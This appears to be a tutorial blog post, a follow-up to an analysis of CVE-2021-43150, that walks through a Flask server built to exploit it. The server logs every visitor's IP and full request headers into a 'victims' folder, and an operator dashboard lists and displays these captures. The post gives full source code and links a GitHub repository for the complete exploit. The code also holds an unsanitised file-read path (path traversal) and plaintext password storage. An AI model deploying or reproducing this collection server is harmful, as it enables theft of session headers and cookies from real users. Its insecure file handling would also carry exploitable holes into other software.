# Introduction
In the analysis of CVE-2021-43150 (read from here). We discuss and explain the weakness. Now, it's time to exploit it.

# Exploit
So, We will turn on the exploit to a simple framework using `Flask` with the follwoing features:
- Dashboard
- Exploit Endpoint
- Login
- SignUp
- JSON file to store the data

## Login
The first endpoint is the `login()` function which is associated with the `/login` route. It handles both `GET` and `POST` requests to this route. If the request method is `POST`, it gets the username and password from the request form and checks if they are correct by looking them up in a `JSON` file called `users.json`. If the username and password are correct, it saves the user's information in the session and redirects the user to the `/dashboard` route. If the username or password is incorrect, it renders the `login.html` template again with an error message. If the request method is `GET`, it simply renders the login.html template.

```
# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'username' in session:
        return redirect('/dashboard')
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']

        # Check if the username and password are correct
        if username in users and users[username]['password'] == password:
            # Save the user information in the session
            session['username'] = username
            session['full_name'] = users[username]['full_name']

            # Redirect to the dashboard
            return redirect('/dashboard')

        else:
            # Invalid credentials, render the login page again with an error message
            error = 'Invalid username or password'
            return render_template('login.html', error=error)

    # If the request method is 'GET', just render the login page
    return render_template('login.html')
```

## SignUp
The `signup()` function is associated with the `/signup` route and also handles both `GET` and `POST` requests. If the request method is `POST`, it gets the username, password, and full name from the request form and checks if the username is already taken by looking it up in the `users.json` file. If the username is not taken, it saves the new user's information to the users.json file and redirects the user to the `/login` route. If the username is already taken, it renders the signup.html template again with an error message. If the request method is `GET`, it simply renders the `signup.html` template.

```
# Signup route
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']
        full_name = request.form['full_name']

        # Check if the username is already taken
        if username in users:
            error = 'Username is already taken'
            return render_template('signup.html', error=error)

        # Save the new user to the JSON file
        users[username] = {
            'password': password,
            'full_name': full_name
        }
        with open('users.json', 'w') as f:
            json.dump(users, f)

        return redirect('/login')

    # If the request method is 'GET', just render the signup page
    return render_template('signup.html')
```

## Dashboard
The `dashboard()` function is associated with the `/dashboard` route and only handles `GET` requests. If the user is not logged in (i.e., the username is not in the session), it redirects the user to the `/login` route. If the user is logged in, it reads the contents of the victims folder and renders the `dashboard.html` template, passing the list of files in the victims folder and the user's full name to the template.

```
# Dashboard route
@app.route('/dashboard')
def dashboard():
    # If the user is not logged in, redirect to the login page
    if 'username' not in session:
        return redirect('/login')
    folder = 'victims'
    files = os.listdir(folder)
    return render_template('dashboard.html', username=session['full_name'], victims_folder=files)
```

## Load_File
This code defines a function called `load_file()` that is run when a client makes a `POST` request to the `/load-file` endpoint of a Flask web application. The first thing the function does is check if the username key is present in the session object. The session object is a dictionary-like object that is used to store data across requests. If username is not in session, then the function redirects the client to the `/login` endpoint. If username is in session, then the function continues to execute. It retrieves the filename from the request.form dictionary, which is a dictionary containing the data sent in the request body as part of a form submission. Next, the function opens the file with the given filename in the victims directory and reads its contents into a variable called `file_content`. Finally, the function renders the results.html template, passing `file_content` and filename as variables to be used in the template. The rendered template is then returned to the client as the response to the request.

```
@app.route('/load-file', methods=['POST'])
def load_file():
    if 'username' not in session:
        return redirect('/login')
    else:
        # Get the filename from the POST request
        filename = request.form['name']

        # Open the file and read its contents
        with open('victims/' + filename, 'r') as f:
            file_content = f.read()

        # Render the dashboard template and pass the file content to the template
        return render_template('results.html', file_content=file_content, the_name=filename)
```

## Logout
First defines a function called `logout()` that is intended to be used as a route in a web application built with a Python framework called Flask. When a user navigates to the `/logout` URL of the web application, this route will be triggered and the logout function will be executed. The function first clears the session, which is a way of storing data on the server associated with the user's session. This might include things like the user's login status, preferences, or other data that the web application wants to remember about the user between requests. After the session is cleared, the function uses the `redirect` function from Flask to redirect the user to the `/login` page. This typically means that the user will be taken to a login page where they can enter their credentials to log in to the web application.

```
# Logout route
@app.route('/logout')
def logout():
    # Clear the session
    session.clear()

    # Redirect to the login page
    return redirect('/login')
```

## Index Page
It is defining a route for the home page of a website `(indicated by the '/' in @app.route('/'))`. When a user navigates to this page, the function `index` is executed. The first line of the function gets the IP address of the user who is accessing the page and stores it in a variable called `user_ip`. The next line opens a file with a name that is the user's IP address and a .txt extension `(e.g. "victims/123.456.789.012.txt")`. The `"w+"` parameter indicates that the file should be opened for both writing and reading. If the file does not exist, it will be created. The next line writes the request headers (information about the request made by the user's browser) to the file as a string. Finally, the function returns the contents of a template called `index.html` to be displayed in the user's browser.

```
# Index page
@app.route('/')
def index():
    user_ip = request.remote_addr
    with open("victims/"+user_ip+".txt", "w+") as file:
        file.write(str(request.headers))
    return render_template("index.html")
```

## Full Code
Here is our code:
```
import json
import os
from flask import Flask, request, redirect, session, render_template

app = Flask(__name__)
app.secret_key = 'your_secret_key'
# Load the JSON file with user data
with open('users.json', 'r') as f:
    users = json.load(f)

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'username' in session:
        return redirect('/dashboard')
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']

        # Check if the username and password are correct
        if username in users and users[username]['password'] == password:
            # Save the user information in the session
            session['username'] = username
            session['full_name'] = users[username]['full_name']

            # Redirect to the dashboard
            return redirect('/dashboard')

        else:
            # Invalid credentials, render the login page again with an error message
            error = 'Invalid username or password'
            return render_template('login.html', error=error)

    # If the request method is 'GET', just render the login page
    return render_template('login.html')

# Signup route
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']
        full_name = request.form['full_name']

        # Check if the username is already taken
        if username in users:
            error = 'Username is already taken'
            return render_template('signup.html', error=error)

        # Save the new user to the JSON file
        users[username] = {
            'password': password,
            'full_name': full_name
        }
        with open('users.json', 'w') as f:
            json.dump(users, f)

        return redirect('/login')

    # If the request method is 'GET', just render the signup page
    return render_template('signup.html')

# Dashboard route
@app.route('/dashboard')
def dashboard():
    # If the user is not logged in, redirect to the login page
    if 'username' not in session:
        return redirect('/login')
    folder = 'victims'
    files = os.listdir(folder)
    return render_template('dashboard.html', username=session['full_name'], victims_folder=files)

@app.route('/load-file', methods=['POST'])
def load_file():
    if 'username' not in session:
        return redirect('/login')
    else:
        # Get the filename from the POST request
        filename = request.form['name']

        # Open the file and read its contents
        with open('victims/' + filename, 'r') as f:
            file_content = f.read()

        # Render the dashboard template and pass the file content to the template
        return render_template('results.html', file_content=file_content, the_name=filename)

# Logout route
@app.route('/logout')
def logout():
    # Clear the session
    session.clear()

    # Redirect to the login page
    return redirect('/login')

# Index page
@app.route('/')
def index():
    user_ip = request.remote_addr
    with open("victims/"+user_ip+".txt", "w+") as file:
        file.write(str(request.headers))
    return render_template("index.html")

if __name__ == '__main__':
    app.run(host="IP")
```

## Endpointa Summary

- `/login`: This endpoint handles the login process. It accepts both GET and POST requests. If the request method is POST, it gets the username and password from the form, checks if the credentials are valid, and saves the user information in the session if the credentials are correct. If the request method is GET, it simply renders the login page.  
- `/signup`: This endpoint handles the signup process. It also accepts both GET and POST requests. If the request method is POST, it gets the username, password, and full name from the form, checks if the username is already taken, and saves the new user to the users.json file if the username is available. If the request method is GET, it simply renders the signup page.
- `/dashboard`: This endpoint renders the dashboard page. It checks if the user is logged in, and redirects to the login page if the user is not logged in. If the user is logged in, it gets a list of the files in the victims folder and renders the dashboard.html template, passing the user's full name and the list of files to the template.      
- `/load-file`: This endpoint handles the process of loading a file and displaying its content in the dashboard page. It accepts only POST requests, and it gets the filename from the POST request. It opens the file and reads its contents, and then renders the results.html template, passing the file content and the filename to the template.      
- `/logout`: This endpoint clears the session and redirects the user to the login page.      
- `/`: This is the index page of the application. It logs the user's IP address and request headers to a file in the victims folder, and renders the index.html template.

# Conclusion
Now, The full coe with usage is on github including the front-end code also screenshots and You can find the full exploit code here on [Github](https://github.com/Zeyad-Azima/OpayForMe).